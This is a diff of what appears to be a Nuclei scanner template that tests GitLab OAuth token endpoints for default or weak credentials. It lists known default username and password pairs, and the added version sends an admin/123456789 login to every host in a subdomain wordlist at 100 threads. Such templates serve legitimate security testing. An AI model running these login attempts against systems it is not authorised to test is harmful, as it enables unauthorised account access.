@@ -1,58 +1,49 @@
-id: gitlab-weak-login
-
+id: gitlab-weak-login 1
 info:
-  name: Gitlab Default Login
-  author: Suman_Kar,dwisiswant0
+  author: Suman_Kar
+  name: Gitlab Weak Login
   severity: high
-  description: Gitlab default login credentials were discovered.
-  reference:
-    - https://twitter.com/0xmahmoudJo0/status/1467394090685943809
-    - https://git-scm.com/book/en/v2/Git-on-the-Server-GitLab
-  classification:
-    cwe-id: CWE-798
-  metadata:
-    shodan-query: http.title:"GitLab"
   tags: gitlab,default-login
+requests:
+- attack: sniper
+  matchers:
+  - status:
+    - 200
+    type: status
+  - part: header
+    type: word
+    words:
+    - application/json
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '"access_token":'
+    - '"token_type":'
+    - '"refresh_token":'
+  matchers-condition: and
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'POST /oauth/token HTTP/1.1
 
-http:
-  - raw:
-      - |
-        POST /oauth/token HTTP/1.1
-        Host: {{Hostname}}
-        Accept: application/json, text/plain, */*
-        Referer: {{BaseURL}}
-        content-type: application/json
+    Host: {{Subdomains}}
 
-        {"grant_type":"password","username":"{{username}}","password":"{{password}}"}
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101
+    Firefox/79.0
 
-    attack: clusterbomb
-    payloads:
-      username:
-        - "root"
-        - "admin"
-        - "admin@local.host"
+    Accept: application/json, text/plain, */*
 
-      password:
-        - "5iveL!fe"
-        - "123456789"
+    Accept-Language: en-US,en;q=0.5
 
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
+    Referer: https://{{Subdomains}}
 
-      - type: word
-        part: header
-        words:
-          - application/json
+    content-type: application/json
 
-      - type: word
-        part: body
-        words:
-          - '"access_token":'
-          - '"token_type":'
-          - '"refresh_token":'
-        condition: and
+    Connection: close
 
-# Enhanced by mp on 2022/03/03
+
+    {"grant_type":"password","username":"admin","password":"123456789"}
+
+    '
+  threads: 100
